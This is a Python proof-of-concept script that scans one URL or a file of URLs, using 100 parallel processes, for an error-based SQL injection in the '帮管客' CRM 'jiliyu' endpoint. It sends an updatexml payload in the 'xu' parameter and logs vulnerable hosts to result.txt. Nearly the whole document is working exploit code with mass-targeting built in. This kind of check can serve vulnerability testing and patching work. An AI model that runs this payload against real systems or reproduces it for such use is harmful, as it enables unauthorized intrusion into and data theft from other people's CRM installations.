import requests,argparse,re,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
 ██████╗ ██████╗ ██╗  ██╗ ██████╗███╗   ███╗██████╗            ██╗██╗██╗     ██╗██╗   ██╗ ██████╗ ██╗   ██╗
██╔════╝ ██╔══██╗██║ ██╔╝██╔════╝████╗ ████║██╔══██╗           ██║██║██║     ██║╚██╗ ██╔╝██╔═══██╗██║   ██║
██║  ███╗██████╔╝█████╔╝ ██║     ██╔████╔██║██████╔╝█████╗     ██║██║██║     ██║ ╚████╔╝ ██║   ██║██║   ██║
██║   ██║██╔══██╗██╔═██╗ ██║     ██║╚██╔╝██║██╔══██╗╚════╝██   ██║██║██║     ██║  ╚██╔╝  ██║   ██║██║   ██║
╚██████╔╝██████╔╝██║  ██╗╚██████╗██║ ╚═╝ ██║██║  ██║      ╚█████╔╝██║███████╗██║   ██║   ╚██████╔╝╚██████╔╝
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝  ╚═╝       ╚════╝ ╚═╝╚══════╝╚═╝   ╚═╝    ╚═════╝  ╚═════╝ 
                                                                                                                                                                                                                      
                                                                    version:帮管客CRM
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description='帮管客CRM jiliyu接口存在SQL漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url,args.file)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\t python:{sys.argv[0]} -h")

def poc(target):
    payload = '/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=%E6%BF%80%E5%8A%B1%E8%AF%AD%E5%88%97%E8%A1%A8&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1))'
    url = target+payload
    header = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        if res.status_code == 500 and 'c4ca4238a0b923820dcc509a6f75849' in res.text:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()
